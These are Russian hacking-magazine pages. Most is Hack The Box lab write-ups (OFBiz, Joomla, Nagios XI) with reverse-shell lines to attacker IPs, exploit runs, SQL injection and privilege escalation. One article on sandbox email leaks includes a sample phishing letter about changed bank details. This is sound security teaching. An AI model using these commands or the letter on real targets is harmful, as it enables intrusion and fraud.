     fmt.Printf("Значение seed: %v\n", iSeed)
   }


   blob, ok := source["blob"].(string)
   if ok {
     fmt.Printf("Значение blob: %s\n", blob)


     rand.Seed(iSeed)
     key := make([]byte, 16)
     for i := range key {
     key[i] = byte(1 + rand.Intn(254))
     }


     decodedBlob, err := base64.URLEncoding.DecodeString(blob)
     if err == nil {
     iv := decodedBlob[:aes.BlockSize]
     encPassword := decodedBlob[aes.BlockSize:]


     block, _ := aes.NewCipher(key)
     stream := cipher.NewCFBDecrypter(block, iv)


     decPassword := make([]byte, len(encPassword))
     stream.XORKeyStream(decPassword, encPassword)


     fmt.Printf("Password: '%s'\n", string(decPassword))
     }
   }
 }
...





                       Получение пароля пользователя

Все операции нужно делать быстро, так как пароль меняется раз в минуту.
Запускаем  новый  листенер   (rlwrap  nc  -lvp  5432)  и  выполняем
реверс‑шелл от имени другого пользователя с помощью RunasCs.


RunasCs.exe backup bFYPKwOpjceZeDRJrcIjytwMAnCMEZiTnVNlVVWU cmd.exe
-r 10.10.16.33:5432 --bypass-uac




                                Запуск RunasCs

И сразу же получаем новую сессию от имени пользователя backup.





                           Флаг рута

Машина захвачена!
ВЗЛОМ





Сегодня мы  с  тобой  проэксплуатируем
связку из  двух  уязвимостей в  продукте
Apache OFBiz. Это позволит обойти аутен‐
тификацию  и  удаленно  выполнять  про‐
извольный код на сервере. Получив сессию             RalfHacker                                                                                             hackerralf8@gmail.com
пользователя, мы  сдампим и  взломаем
хеши из базы данных все того же OFBiz.


Наша цель — получение прав суперпользователя на машине Bizness с учеб‐
ной площадки Hack The Box. Уровень задания — легкий.


           WARNING

                            Подключаться к машинам с HTB рекомендуется
                            только через VPN. Не делай этого с компьютеров,
                        где есть важные для тебя данные, так как ты ока‐
                        жешься в общей сети с другими участниками.



РАЗВЕДКА

Сканирование портов
Добавляем IP-адрес машины в /etc/hosts:


10.10.11.252    bizness.htb

И запускаем сканирование портов.

Справка: сканирование портов
Сканирование портов — стандартный первый шаг при любой атаке. Он поз‐
воляет атакующему узнать, какие службы на хосте принимают соединение.
На основе этой информации выбирается следующий шаг к получению точки
входа.
   Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи следующего скрипта:


 #!/bin/bash
 ports=$(nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '\n' ',' | sed s/,$//)
 nmap -p$ports -A $1


Он действует в два этапа. На первом производится обычное быстрое ска‐
нирование, на втором — более тщательное сканирование, с использованием
имеющихся скриптов (опция -A).





                             Результат работы скрипта

Сканер нашел три открытых порта:
 • 22 — служба OpenSSH 8.4p1;
 • 80 и 443 — веб‑сервер Nginx 1.18.0.

На порте 80 автоматически выполняется редирект на https://bizness.htb.
Этот адрес мы уже внесли в /etc/hosts, поэтому остается только открыть
браузер и посмотреть, что там за сайт.





                           Главная страница сайта


ТОЧКА ВХОДА

На сайте ничего интересного найти не удалось, поэтому приступим к ска‐
нированию.

Справка: сканирование веба c feroxbuster
Одно из первых действий при тестировании безопасности веб‑приложе‐
ния — это сканирование методом перебора каталогов, чтобы найти скрытую
информацию и недоступные обычным посетителям функции. Для этого можно
использовать программы вроде dirsearch, DIRB или  ffuf. Я предпочитаю
feroxbuster.
  При запуске указываем следующие параметры:
 • -u — URL;
 • -k — игнорировать ошибки SSL;
 • -w — словарь (я использую словари из набора SecLists);
 • -t — количество потоков;
 • -d — глубина сканирования.



Запускаем feroxbuster , задав все нужные параметры:


feroxbuster -k -u https://bizness.htb/ -t 128 -d 1 -w directory_2.3_
medium_lowercase.txt




            Результат сканирования каталогов с помощью feroxbuster

Страница /control выдает ошибку, попробуем просканировать вложенные
каталоги.





                      Содержимое страницы control


feroxbuster -k -u https://bizness.htb/control/ -t 128 -d 1 -w
directory_2.3_medium_lowercase.txt




            Результат сканирования каталогов с помощью feroxbuster

Находим еще три страницы. На странице /login узнаём версию Apache
OFBiz.





                   Страница авторизации Apache OFBiz


ТОЧКА ОПОРЫ

Первым делом стоит проверить, есть ли готовые эксплоиты для работающей
на сервере программы. Проще всего поискать их в Google.





                         Поиск эксплоитов в Google

Первая же ссылка ведет на эксплоит для уязвимостей СVE-2023-51467 и CVE-
2023-49070. Наша версия Apache OFBiz содержит уязвимость, которая поз‐
воляет обойти аутентификацию и выполнить на сервере произвольный код.
Но  сначала нам  нужно  убедиться, что  уязвимость  действительно  есть.
Для этого используем сканер из найденного репозитория.
  В качестве параметра сканеру достаточно передать лишь URL сайта.


python3 xdetection.py --url https://bizness.htb





                         Проверка наличия уязвимости

Наша версия точно уязвима, а значит, можно запустить локальный веб‑сер‐
вер и для теста выполнить на удаленном хосте команду curl, которая обратит‐
ся к нашему серверу.
   Запускаем сервер:


python3 -m http.server 80

Выполняем эксплоит:


python3 exploit.py --url https://bizness.htb --cmd 'curl http://10.
10.16.76/test_rce'





                         Результат выполнения эксплоита





                               Логи веб‑сервера

Запрос пришел, а значит, мы точно так же можем запустить и реверс‑шелл.

Справка: реверс-шелл
Обратный шелл — это подключение, которое активирует атакуемая машина,
а мы принимаем и таким образом подключаемся к ней, чтобы выполнять
команды от лица пользователя, запустившего шелл. Для приема соединения
необходимо создать на локальной машине listener, то есть «слушатель».


Сначала запускаем листенер:


pwncat-cs -lp 4321

Теперь нам нужно запустить реверс‑шелл на сервере. Возьмем вот такой
вариант, который использует системную утилиту nc:


nc 10.10.16.76 4321 -e /bin/bash

Через эксплоит выполняем эту команду на сервере:


python3 exploit.py --url https://bizness.htb --cmd 'nc 10.10.16.76
4321 -e /bin/bash'





                        Сессия пользователя OFBiz

Первый флаг расположен в домашнем каталоге пользователя, забираем его.





                       Флаг пользователя


ЛОКАЛЬНОЕ ПОВЫШЕНИЕ ПРИВИЛЕГИЙ

Мы на целевой машине, но как пользователь. Чтобы найти пути для повыше‐
ния привилегий, я, как обычно, воспользуюсь скриптами PEASS.

Справка: скрипты PEASS
Что делать после того, как мы получили доступ в систему от имени поль‐
зователя? Вариантов дальнейшей эксплуатации и повышения привилегий
может быть очень много, как в Linux, так и в Windows. Чтобы собрать
информацию и наметить цели, можно  использовать  Privilege  Escalation
Awesome Scripts SUITE (PEASS) — набор скриптов, которые проверяют сис‐
тему на автомате и выдают подробный отчет о потенциально интересных
файлах, процессах и настройках.


Загружаем на хост скрипт для Linux, даем ему право на выполнение и запус‐
каем сканирование. В выводе множество информации, но ничего, что нам
помогло бы. Единственный интересный момент — файлы с какими‑то пароля‐
ми в каталоге ofbiz.





                       Найденные файлы с паролями

Давай попробуем отобрать файлы, в которых также есть строка login.


cd /opt/ofbiz/
find ./ -name * login* -type f
find ./ -name * Login* -type f





                    Файлы, содержащие подстроку login

Вот в этом файле нашелся шаблон хеша пароля:


/opt/ofbiz/framework/resources/templates/AdminUserLoginData.xml





                Содержимое файла AdminUserLoginData.xml

Попробуем найти все такие хеши: поищем во всех файлах строку SHA.


grep -R 'SHA' ./ | grep -v '\.log\
|47b56994cbc2b6d10aa1be30f70165adb305a41a\|SHARE'





                Список файлов, содержащих подстроку SHA

В выводе много файлов с расширением .dat. Grep не выводит подстроки
из  файлов,  так как они бинарные, а не  текстовые. Но можно  просто
с помощью утилиты strings извлечь из этих файлов все строки, а потом
передать их в grep.


strings ./runtime/data/derby/ofbiz/seg0/*.dat | grep SHA




                      SHA-хеш из базы DAT

Чтобы понять, что это за хеш и как его перебрать, можно поискать его
в Google.





                               Поиск в Google

Третья  ссылка приводит  к исходному коду модуля на GitHub. Функция
getCryptedBytes содержит код для форматирования хеша.





                  Исходный код функции getCryptedBytes

Таким образом, байты хеша сначала кодируются в Base64, затем символ _
меняется на /, а минус на плюс. Чтобы получить хеш в шестнадцатеричном
представлении,  нужно  произвести  обратные  замены,  декодирование
Base64 и кодирование в HEX.


echo 'uP0/QaVBpDWFeo8+dRzDqRwXQ2I' | base64 -d | xxd -p





                        Получение хеша в формате hex

Так как первоначальный формат $SHA$d$... содержит соль d, нужно найти
режим hashcat, отвечающий за вычисления хеша sha1 от соли и пароля.





                           Режимы hashcat

Теперь  можно  перебрать хеш в формате хеш:соль,  указав при этом
режим 120 (-m).


hashcat -a 0 -m 120 'b8fd3f41a541a435857a8f3e751cc3a91c174362:d'
rockyou.txt





                             Результат перебора хеша

С полученным паролем авторизуемся от имени рута и забираем второй флаг.





                           Флаг рута

Машина захвачена!
ВЗЛОМ





В сегодняшнем райтапе мы с тобой проэкс‐
плуатируем   прошлогоднюю   уязвимость
в Apport — системе сообщений о неполад‐
ках в Ubuntu. Но чтобы получить доступ
к ней, сначала проведем атаку на Joomla,             RalfHacker                                                                                             hackerralf8@gmail.com
получим сессию на сервере и найдем учет‐
ные данные пользователя.


Все это — в рамках прохождения машины Devvortex с учебной площадки Hack
The Box. Уровень сложности задания отмечен как легкий.


           WARNING

                            Подключаться к машинам с HTB рекомендуется
                            только через VPN. Не делай этого с компьютеров,
                        где есть важные для тебя данные, так как ты ока‐
                        жешься в общей сети с другими участниками.



РАЗВЕДКА

Сканирование портов
Добавляем IP-адрес машины в /etc/hosts:


10.10.11.242   devvortex.htb

И запускаем сканирование портов.

Справка: сканирование портов
Сканирование портов — стандартный первый шаг при любой атаке. Он поз‐
воляет атакующему узнать, какие службы на хосте принимают соединение.
На основе этой информации выбирается следующий шаг к получению точки
входа.
   Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи следующего скрипта:


 #!/bin/bash
 ports=$(nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '\n' ',' | sed s/,$//)
 nmap -p$ports -A $1


Он действует в два этапа. На первом производится обычное быстрое ска‐
нирование, на втором — более тщательное сканирование, с использованием
имеющихся скриптов (опция -A).





                             Результат работы скрипта

Сканер нашел два открытых порта:
 • 22 — служба OpenSSH 8.2p1;
 • 80 — веб‑сервер Nginx 1.18.0.

Выбор небольшой, поэтому осмотрим веб‑сервер.





                           Главная страница сайта


ТОЧКА ВХОДА

На сайте ничего интересного найти не удалось, поэтому приступим к ска‐
нированию.

Справка: сканирование веба c feroxbuster
Одно из первых действий при тестировании безопасности веб‑приложе‐
ния — это сканирование методом перебора каталогов, чтобы найти скрытую
информацию и недоступные обычным посетителям функции. Для этого можно
использовать программы вроде dirsearch, DIRB или  ffuf. Я предпочитаю
feroxbuster.
  При запуске указываем следующие параметры:
 • -u — URL;
 • -w — словарь (я использую словари из набора SecLists);
 • -t — количество потоков;
 • -d — глубина сканирования.



Задаем все аргументы и запускаем feroxbuster :


feroxbuster -u http://devvortex.htb/ -t 128 -d 1 -w directory_2.3_
medium_lowercase.txt





            Результат сканирования каталогов с помощью feroxbuster

Опять же ничего интересного не получаем, поэтому сканируем поддомены.
Для этого используем ffuf. Параметры следующие:
 • -u — URL;
 • -w — словарь;
 • -t — количество потоков;
 • -H — HTTP-заголовок.


ffuf -u "http://devvortex.htb/" -H 'Host: FUZZ.devvortex.htb' -t 128
-w subdomains-top1million-110000.txt





              Результат сканирования поддоменов с помощью ffuf

Но в вывод приложения попадают все варианты из списка, поэтому нужно
добавить фильтр по размеру страницы (параметр -fs):


ffuf -u "http://devvortex.htb/" -H 'Host: FUZZ.devvortex.htb' -t 128
-w subdomains-top1million-110000.txt -fs 154



              Результат сканирования поддоменов с помощью ffuf

Мы нашли поддомен dev, а значит, обновляем запись в файле /etc/hosts:


10.10.11.242 devvortex.htb dev.devvortex.htb

И идем смотреть обнаруженный сайт.





                           Главная страница сайта

Но и здесь не нашлось ничего, что можно было бы использовать для развития
атаки. Значит, нужно сканировать файлы и каталоги.


feroxbuster -u http://dev.devvortex.htb/ -t 128 -d 1 -w files_
interesting.txt





            Результат сканирования каталогов с помощью feroxbuster

В выводе видим файл robots.txt.


Справка: robots.txt
Этот файл используется для того, чтобы попросить краулеры (например,
Google, Яндекс и прочие) не трогать какие‑то определенные каталоги. Нап‐
ример, никто не хочет, чтобы в поисковой выдаче появлялись страницы авто‐
ризации администраторов  сайта, файлы или персональная информация
со страниц пользователей и прочие вещи в таком духе. Однако и злоумыш‐
ленники первым делом просматривают этот файл, чтобы узнать о файлах
и каталогах, которые хочет спрятать администратор сайта.





                      Содержимое файла robots.txt

Получаем интересные страницы, а также узнаём, что используется Joomla.
А из файла README.txt узнаём и версию этой системы управления кон‐
тентом.





                     Содержимое файла README.txt




                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
      HTB DEVVORTEX
       ПОВЫШАЕМ ПРИВИЛЕГИИ ЧЕРЕЗ
               УЯЗВИМОСТЬ В APPORT





ТОЧКА ОПОРЫ

Первым делом стоит проверить, есть ли для обнаруженной CMS уже готовые
эксплоиты. Самый надежный способ найти готовый эксплоит — поискать
в интернете на сайтах вроде HackerOne, Exploit-DB, а также GitHub.





                         Поиск эксплоитов в Google

Вторая ссылка ведет к эксплоиту для уязвимости CVE-2023-23752, которая
дает неавторизованному пользователю возможность получить приватную
информацию, включая учетные данные зарегистрированных пользователей.
Устанавливаем необходимые модули Ruby и запускаем эксплоит.


sudo gem install httpx docopt paint
ruby exploit.rb http://dev.devvortex.htb





                            Результат работы эксплоита

Получаем учетные данные, в том числе и администратора CMS.


Joomla Super User → RCE
Если у нас есть привилегии администратора в CMS, можно загрузить на сер‐
вер свой код и выполнить его, а это дает нам возможность получить RCE.
В Joomla перейдем на вкладку System к настройке Site Templates.





                       Содержимое вкладки System





                         Активные шаблоны Joomla

Выбираем доступный шаблон и получаем доступ к его файлам. Самый
безобидный для работы сайта файл — это error.php.





                       Содержимое файла error.php

В качестве выполняемого кода используем реверс‑шелл pentestmonkey.

Справка: реверс-шелл
Обратный шелл — это подключение, которое активирует атакуемая машина,
а мы принимаем и таким образом подключаемся к ней, чтобы выполнять
команды от лица пользователя, запустившего шелл. Для приема соединения
необходимо создать на локальной машине listener, то есть «слушатель».





                           Новый код error.php

Осталось запустить листенер pwncat-cs -lp 4321 и обратиться к изменен‐
ному    файлу   http://dev.devvortex.htb/administrator/templates/
cassiopeia/error.php.





                      Сессия пользователя www-data


ПРОДВИЖЕНИЕ

Так как на хосте развернут веб‑сервер, а на нем работает система управле‐
ния контентом, то первое наше действие — попробовать извлечь из ее базы
данных учетные данные пользователей. Высока вероятность, что эти учетные
данные подойдут и для пользователей ОС тоже. Креды для подключения
к базе у нас есть, используем их при авторизации в MySQL. Затем сразу
переходим к базе данных joomla.


mysql -h localhost -u lewis -p


use joomla;





                     Подключение к базе данных joomla

Учетные данные Joomla хранит в таблице users, но для всех таблиц исполь‐
зуется префикс. Вывод эксплоита содержал и его: sd4fg_. Нас интересуют
колонки username и password.


select username,password from sd4fg_users;





                       Учетные данные пользователей

Используется сложный алгоритм хеширования bcrypt, поэтому взлом может
занять некоторое время. Перебирать будем только хеш пароля пользователя
logan.


hashcat -m 3200 hash.txt rockyou.txt





                               Результат взлома хеша

С полученными учетными данными авторизуемся через SSH и забираем пер‐
вый флаг.





                       Флаг пользователя


ЛОКАЛЬНОЕ ПОВЫШЕНИЕ ПРИВИЛЕГИЙ

Существует множество мест, которые стоит проверить в Linux в поисках пути
для повышения привилегий. Одно из основных — файл /etc/sudoers, где
хранится список команд, которые разные группы пользователей могут выпол‐
нять от имени администратора системы.
   Выведем содержимое этого файла:


sudo -l





                               Настройки sudoers

И обнаруживаем, что любой пользователь при предъявлении своего пароля
может выполнить команду /usr/bin/apport-cli в привилегированном кон‐
тексте.
   Apport — это  приложение, которое  автоматически собирает данные
об аварийных завершениях процессов, а затем составляет и сохраняет отчет
в каталог /var/crash/.
   Давай посмотрим, нет ли в Apport свежих уязвимостей. Для этого проще
всего использовать Google.





                        Поиск уязвимостей в Google





                         Описание уязвимости

Находим уязвимость CVE-2023-26604. Как сказано в ее описании, исполня‐
емый файл apport-cli до версии 2.26.0 включительно дает возможность
выполнить команду в терминале. Учитывая, что apport-cli в нашей системе
работает с рутовыми правами, это позволит и нам получить их. Версия Apport
у нас как раз уязвимая.





                           Версия приложения

Зная идентификатор уязвимости, находим сначала подробное описание,
а затем и технику для эксплуатации.





                    Способ эксплуатации уязвимости

В первую очередь стоит сделать что‑то, что вызовет срабатывание Apport.
Запустим, а потом аварийно завершим процесс.


sleep 10 &
killall -SIGSEGV sleep





                        Запуск и завершение процесса

Apport сохранил отчет, и теперь мы можем его обработать и перейти к выпол‐
нению шелла.





                             Вывод apport-cli

Затем выполняем процесс /bin/bash и получаем командную оболочку с пра‐
вами рута.





                           Флаг рута

А это значит, что наша цель выполнена и машина захвачена!
ВЗЛОМ





В этом райтапе мы поработаем с API сис‐
темы мониторинга Nagios XI, проэксплуати‐
руем  SQL-инъекцию,  создадим  своего
пользователя и злоупотребим возможнос‐
тями админа, чтобы получить доступ к опе‐            RalfHacker                                                                                             hackerralf8@gmail.com
рационной системе. Затем несложным спо‐
собом повысим привилегии в Linux.


Наша цель — получение прав суперпользователя на машине Monitored
с учебной площадки Hack The Box. Уровень сложности задания — средний.


           WARNING

                            Подключаться к машинам с HTB рекомендуется
                            только через VPN. Не делай этого с компьютеров,
                        где есть важные для тебя данные, так как ты ока‐
                        жешься в общей сети с другими участниками.



РАЗВЕДКА

Сканирование портов
Добавляем IP-адрес машины в /etc/hosts:


10.10.11.248    monitored.htb

И запускаем сканирование портов.

Справка: сканирование портов
Сканирование портов — стандартный первый шаг при любой атаке. Он поз‐
воляет атакующему узнать, какие службы на хосте принимают соединение.
На основе этой информации выбирается следующий шаг к получению точки
входа.
   Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи следующего скрипта:


 #!/bin/bash
 ports=$(nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '\n' ',' | sed s/,$//)
 nmap -p$ports -A $1


Он действует в два этапа. На первом производится обычное быстрое ска‐
нирование, на втором — более тщательное сканирование, с использованием
имеющихся скриптов (опция -A).





                             Результат работы скрипта

Часто я дополнительно проверяю порт UDP 161.


sudo nmap -p161 -sU 10.10.11.248

В этот раз он оказался открыт.





                       Результат сканирования UDP-портов

Итого сканер нашел шесть открытых портов:
 • 22 — служба OpenSSH 8.4p1;
 • 80 и 443 — веб‑сервер Apache 2.4.56;
 • 389 — служба LDAP;
 • 5667 — неизвестный сервис;
 • 161 (UDP) — служба SNMP.

Также в выводе Nmap подмечаем редирект с порта 80 на адрес nagios.
monitored.htb. Его тоже добавляем в /etc/hosts:


10.10.11.248 monitored.htb nagios.monitored.htb

Поскольку доступна служба SNMP, начнем именно с нее.


ТОЧКА ВХОДА

SNMP — простой протокол управления сетью. Он используется для монито‐
ринга устройств в сети (например, маршрутизаторов, коммутаторов, прин‐
теров).
   Тут следует сразу упомянуть два понятия:
 • MIB (Management Information Base) — база данных, хранящая информа‐
  цию обо всех объектах (параметрах и настройках) устройства;
 • OID (Object Identifier) — числовой идентификатор объекта в дереве MIB.

При работе с удаленной системой по SNMP все запросы делаются по OID,
который отражает положение объекта в дереве объектов MIB. Но чтобы
получить всю информацию, нам сначала нужно пройти своеобразную аутен‐
тификацию, указав идентификатор сообщества. Так как мы ее не знаем, ее
нужно перебрать, к примеру с помощью утилиты onesixtyone. Перебирать
будем по словарю из набора SecLists.


onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-
community-strings.txt 10.10.11.248




                       Перебор community-строк

В итоге нашли всего одну community-строку — public. Все OID системы мож‐
но получить, просканировав устройство, например вот такой командой:


snmpwalk -v 2c -c public 10.10.11.248





                      Данные, полученные из системы

Среди списков процессов есть скрипт check_host.sh, который получает
в качестве параметров учетные данные. Больше в выводе ничего интерес‐
ного нет, поэтому переходим к изучению сайта на обнаруженном при ска‐
нировании портов веб‑сервере.





                 Главная страница сайта nagios.monitored.htb

Перейдя по главной ссылке, видим форму авторизации мониторинговой сис‐
темы Nagios XI.





                            Система Nagios XI


ТОЧКА ОПОРЫ

С имеющимися учетными данными авторизоваться в сервисе не вышло.
У Nagios XI есть веб‑терминал, но и там авторизация неудачна.





                      Содержимое страницы terminal

Если учетная запись присутствует, но авторизация ей не разрешена, можно
попробовать использовать API. Но и там нужен аутентификатор.


https://nagios.monitored.htb/Nagios XI/api/v1/user





                            Результат запроса к API user

Получить аутентификатор можно с помощью API authenticate, но данные авто‐
ризации нужно посылать методом POST.


curl -k https://nagios.monitored.htb/Nagios XI/api/v1/authenticate




                        Результат запроса к API authenticate


curl -X POST -k 'https://nagios.monitored.htb/Nagios XI/api/v1/
authenticate/' -d 'username=svc&password=XjH7VCehowpR1xZB' | jq





                          Получение аутентификатора

Однако и теперь ничего нельзя сделать. Так как других вариантов нет, поп‐
робуем найти публичные эксплоиты для нашей версии Nagios  XI. Искать
для начала можно прямо в Google.





                         Поиск эксплоитов в Google

Потратив некоторое время, я вышел на описание нескольких уязвимостей
для Nagios XI, в частности CVE-2023-40931.





                       Описание CVE-2023-40931

На странице admin/banner_message-ajaxhelper.php  присутствует SQL-
инъекция в параметре id. Немного перебрав разные варианты запроса, я
определил тот, который можно использовать для эксплуатации уязвимости.
Помимо приведенных в статье данных, нужно указать полученный при аутен‐
тификации через API токен.
   Чтобы быстро выудить все данные, будем использовать sqlmap.


sqlmap -u "https://nagios.monitored.htb/Nagios XI/admin/
banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=3&
token=ce7a353cd90beeeeaba162da874024b84e9e6b3f" -p id --batch





                      Обнаруженная sqlmap нагрузка

Так как известны название базы и таблицы, можно быстро сдампить данные.


sqlmap -u "https://nagios.monitored.htb/Nagios XI/admin/
banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=3&
token=ce7a353cd90beeeeaba162da874024b84e9e6b3f" -p id -D Nagios XI -T
 xi_users --dump --batch





                       Данные из таблицы xi_users


ПРОДВИЖЕНИЕ

В базе  всего два  пользователя, при этом скомпрометированный поль‐
зователь svc неактивен.



                         Данные из базы данных

Сбрутить хеш у меня не вышло, однако теперь у нас есть токен api_key адми‐
нистратора системы. Этот ключ можно использовать для добавления нового
пользователя, как указано на странице поддержки Nagios XI. Чтобы наш поль‐
зователь был администратором, зададим параметр auth_level.


curl -X POST -k "https://nagios.monitored.htb/Nagios XI/api/v1/
system/
user?
apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CH
LL&
pretty=1" -d "username=ralf&password=ralf&name=Ralf&email=ralf@ralf.
com&auth_level=admin"





                                 Ответ сервера

Теперь можно авторизоваться от имени созданного пользователя.





                      Главная страница администратора

Админ может выполнять системные команды на сервере. Для этого в главном
меню нужно выбрать Configure → Core Config Manager, а затем в панели сле‐
ва — Commands.





                           Меню Nagios XI





                      Страница Core Config Manager

На странице Command Management нужно создать команду, которая акти‐
вирует реверс‑шелл:


bash -c 'bash -i >& /dev/tcp/10.10.16.45/4321 0>&1





                     Страница Command Management

Давай теперь выполним эту команду. Для этого переходим в меню Hosts, где
создаем новую запись. В параметре Check command выбираем созданную
ранее команду.





                             Страница Hosts





                       Страница Host Management

Когда все готово, запускаем листенер (pwncat-cs -lp 4321) и триггерим
команду кликом по кнопке Run Check Command.





                          Результат выполнения команды





                       Флаг пользователя

В итоге получаем сессию на сервере от имени пользователя nagios.


ЛОКАЛЬНОЕ ПОВЫШЕНИЕ ПРИВИЛЕГИЙ

Первым делом нужно собрать информацию для дальнейшего продвижения. Я
буду использовать для этого скрипты PEASS.

Справка: скрипты PEASS
Что делать после того, как мы получили доступ в систему от имени поль‐
зователя? Вариантов дальнейшей эксплуатации и повышения привилегий
может быть очень много, как в Linux, так и в Windows. Чтобы собрать
информацию и наметить цели, можно  использовать  Privilege  Escalation
Awesome Scripts SUITE (PEASS) — набор скриптов, которые проверяют сис‐
тему на автомате и выдают подробный отчет о потенциально интересных
файлах, процессах и настройках.


Закидываем на хост скрипт для Linux, даем ему право на выполнение и запус‐
каем  сканирование. В выводе  много информации,  поэтому  пройдемся
по основным моментам.
   Есть несколько файлов .services, куда мы можем производить запись.





                        Файл .services

В настройках sudoers — много команд, которые можно выполнить от имени
root без ввода пароля.





                               Настройки sudoers

Скрипт  /usr/local/nagiosxi/scripts/manage_services.sh   позволяет
управлять многими службами, в том числе npcd.



                  Содержимое файла manage_services.sh

Мы можем записывать в файл этой службы. Добавив в него команду, мы
можем, например, дать права суперпользователя командной оболочке:


chmod u+s /bin/bash





               Содержимое файла /usr/local/nagios/bin/npcd

Теперь останавливаем и запускаем службу. У файла командной оболочки
появился S-бит, а значит, и права рута.


sudo /usr/local/Nagios XI/scripts/manage_services.sh stop npcd
sudo /usr/local/Nagios XI/scripts/manage_services.sh start npcd





                                Запуск службы

Заходим снова и забираем флаг рута.


/bin/bash -p





                           Флаг рута

Машина захвачена!
ПРИВАТНОСТЬ





Сегодня  мы  разберем   случаи,   когда
безопасники  компании  сами  нечаянно
устраивают  утечки данных своих работо‐
дателей и клиентов. В этом им помогают
«онлайновые песочницы», куда корреспон‐        Джураев Алишер                                                                                     Исследователь социальной
денцию часто загружают на  проверку. Я        инженерии в StopPhish.                                                                                                alisher.rossa@gmail.com
изучил   коллекцию   доступных   писем
на одном  из  таких  сервисов и нашел
немало интересного.


Итак, чтобы проверить подозрительное письмо, его можно загрузить на спе‐
циальный сервис‑песочницу, и тот определит, есть ли в содержимом фишин‐
говые гиперссылки. Одна проблема: некоторые сервисы, вроде изученного
мной Any.Run, на бесплатном тарифе предательски выкладывают всю про‐
веряемую корреспонденцию в паблик, а там она становится легкой добычей
тех, от кого предполагалось защищаться.


        WWW

                      Вот   несколько   других  облачных   песочниц,
                        в  которых  пентестеры  также  могут  поискать
                         полезную информацию:
                        •joesandbox.com;
                           •urlscan.io;
                            •tria.ge;
                          •hybrid-analysis.com.



ДАННЫЕ В ПОДПИСЯХ

Вот простой пример утечки: на почту менеджера по снабжению пришло
подозрительное письмо с предложением зарегистрироваться на некоем пор‐
тале (скорее всего, это фишинг для кражи регистрационных данных). Менед‐
жер форварднул письмо сотруднику службы безопасности (при этом в сооб‐
щение автоматически добавилась его подпись с контактными данными),
а безопасник, не почистив тело сообщения, залил его в облако. Теперь мы
знаем ФИО менеджера, его должность, адрес электронной почты и телефон‐
ные номера, включая даже мобильный. Алло, это служба безопасности банка!





Старательно изучив открытые источники, можно собрать большой объем
дополнительных сведений: наименования дистрибьюторов, клиентов и пар‐
тнеров фирмы. Если не полениться и заглянуть на официальный сайт этой
компании, есть шанс наткнуться, например, на такую страницу.





Теперь, проявив немного смекалки и используя методы социальной инже‐
нерии, мы можем отправить тому самому менеджеру примерно такое элек‐
тронное письмо:

      Уважаемый Райан Гослингович.
      Мы (название компании поставщика) спешим сообщить об изме-«
       нениях в наших процедурах заказа. Мы хотели бы, чтобы Вы обратили
      внимание на следующие изменения и приняли меры в соответствии
      с нашими новыми требованиями:
        1. Изменение банковских реквизитов для оплаты.
        2. Новые формы документации для подтверждения заказов.
        3. Обновленные процедуры оформления договоров.

       Посылаем Вам во вложении подробную информацию об этих обновле-
       ниях. Пожалуйста, ознакомьтесь с ней. Благодарим за понимание
      и оперативное реагирование на наши изменения. Если у Вас воз-
      никнут вопросы или потребуются уточнения, пожалуйста, свяжитесь
      с нами по указанным контактным данным.
       С уважением,
       команда (ООО «РАНДОМ»)                »
Шансы, что получатель такого сообщения, которого назвали по имени‑отчес‐
тву, да еще и прислали информацию от якобы знакомого контрагента, отре‐
агирует на письмо, достаточно велики. Что и требуется злоумышленнику.
   Осторожно, двери  закрываются, мы едем дальше. Если хорошенько
порыться в песочнице, можно найти, например, такое.





Получал ли ты по почте приглашения на бесплатные вебинары для бухгалте‐
ров, специалистов по персоналу, недвижимости или для экспертов по раз‐
ведению декоративных ангорских хомячков? Наверняка! Вот и офис‑менед‐
жеру одного из предприятий посчастливилось попасть в число приглашен‐
ных. Но девушка оказалась осмотрительной (видимо, раньше уже выигрывала
корпоративный чемпионат по запуску исполняемых вложений в сообщения
email) и скинула это письмо безопаснику для проверки. Тот решил протес‐
тировать его через песочницу, в результате чего спалил должность, ФИО
и контактные данные адресата исходного письма. Знание имен сотрудников
административного  отдела  организации  открывает широкое  окно  воз‐
можностей для злоумышленников.
   Вот еще один пример, позаимствованный на том же сервисе. Замес‐
тителю  гендиректора по безопасности крупного предприятия поступило
письмо с  вложенным макросом. Должность  «заместитель  гендиректора
по безопасности» звучит солидно — это очень опытный специалист в сфере
ИБ. Поэтому он незамедлительно поделился со всем человечеством своими
контактными данными, включая номер мобильного телефона, ФИО и поч‐
товый адрес на корпоративном сервере. Если вдруг решишь позвонить ему
на трубку, передавай пламенный привет.





ЦЕПОЧКА ПЕРЕСЫЛАЕМЫХ СООБЩЕНИЙ

Следующая по распространенности категория среди утечек конфиденциаль‐
ных данных — это ситуация, когда сотрудники отдела безопасности заливают
в песочницу не одно письмо, а сразу цепочку пересылаемых сообщений.
Здесь можно выяснить имена, контактные данные и должности сразу нес‐
кольких сотрудников предприятия (среди них вполне может оказаться и выс‐
шее руководство). Бонусом идут сведения о переговорном процессе.
  В этом случае злоумышленнику не нужно даже думать о теме и содер‐
жании будущего фишингового письма: всеми ценными сведениями с ним
любезно поделился специалист по информационной безопасности.





КОПИИ ПИСЕМ

Вот еще один пример. В письме от злоумышленника содержится вложение
с поддельной электронной подписью и встроенным макросом. Письмо было
отправлено на множество адресов одной и той же компании — все они
перечислены среди получателей. Собрав эти адреса и выяснив должность
каждого сотрудника, опытный социальный инженер вполне может пустить всю
систему безопасности корпорации по одному месту.





ПОЛЕЗНЫЕ ВЛОЖЕНИЯ

Вложения в почтовые сообщения могут быть не только опасными, но и крайне
полезными — например, для собирающего информацию о потенциальной
жертве  хакера.  Так, в этом фишинговом  письме  предпринята  попытка
манипуляции с целью кражи паролей. Из письма и приложенного документа
становится понятно, каким почтовым сервисом пользуется компания.





